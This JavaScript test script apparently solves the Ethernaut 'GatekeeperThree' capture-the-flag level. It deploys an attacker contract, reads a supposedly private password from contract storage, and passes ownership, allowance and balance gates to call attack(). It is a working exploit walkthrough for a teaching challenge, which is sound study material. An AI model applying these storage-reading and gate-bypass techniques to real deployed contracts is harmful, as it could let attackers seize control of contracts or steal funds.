const { expect } = require("chai")
const { createChallenge, submitLevel } = require("./utils")

let s1, attacker, challenge, tx

before(async () => {
    ;[s1] = await ethers.getSigners()

    //TODO don't specify blockNumber in hardhat.config.js => //blockNumber: 2500000,
    // https://sepolia.etherscan.io/tx/0x8e7f6c79daaaef28b96bf701be5313d185d0c09cbcd40d8b06b4e3d83bc6bbd2
    const challengeAddress = await createChallenge("0x653239b3b3E67BC0ec1Df7835DA2d38761FfD882")
    challenge = await ethers.getContractAt("GatekeeperThree", challengeAddress)

    const attackerFactory = await ethers.getContractFactory("GatekeeperThreeAttacker")
    attacker = await attackerFactory.deploy(challenge.address)
})

it("solves the challenge", async function () {
    //to pass gate1, we have to set the owner to our attacker contract
    //send from a contract that has no receive or fallback function, so it cannot receive any ETH
    tx = await attacker.setOwner()
    await tx.wait()

    // console.log("SimpleTrick Address", await challenge.trick()) //initial address is 0x0
    //to pass gate2: create an instance of Trick => get password from Trick => call getAllowance with correct password
    tx = await challenge.createTrick()
    await tx.wait()

    const trickAdress = "0x" + (await ethers.provider.getStorageAt(challenge.address, 2)).slice(-40)
    console.log("Trick address: ", trickAdress)

    const trickFactory = await ethers.getContractFactory("SimpleTrick")
    trick = await trickFactory.attach(trickAdress)

    let password = await ethers.provider.getStorageAt(trick.address, 2)
    console.log("Password: ", password)

    //allowEntrance is at the same slot as entrant => slot 1 => entrant takes up the first 20 bytes (left padded with zeroes)
    //allowEntrance takes up the remaining 12 bytes (left padded with zeroes => 23 zero's & 1 bit for false or true)
    console.log(
        "Entrance before: ",
        (await ethers.provider.getStorageAt(challenge.address, 1)).slice(25, 26) //take inot account "0x" => add 2
    )

    tx = await challenge.getAllowance(password)
    await tx.wait()

    console.log(
        "Entrance after: ",
        (await ethers.provider.getStorageAt(challenge.address, 1)).slice(25, 26)
    )

    //to pass gate3 : send > 0.001 ETH to GatekeeperThree => call enter from attacker contract (cannot receive any ETH)
    tx = await s1.sendTransaction({
        from: s1.address,
        to: challenge.address,
        value: ethers.utils.parseEther("0.0011"),
    })
    await tx.wait()

    console.log("GatekeeperThree balance: ", await ethers.provider.getBalance(challenge.address))

    console.log("Owner: ", await ethers.provider.getStorageAt(challenge.address, 0))
    console.log("Attacker address: ", attacker.address)
    console.log("Attacker balance before: ", await ethers.provider.getBalance(attacker.address))

    tx = await attacker.attack()
    await tx.wait()

    console.log("Attacker balance after: ", await ethers.provider.getBalance(attacker.address))
})

after(async () => {
    expect(await submitLevel(challenge.address), "level not solved").to.be.true
})
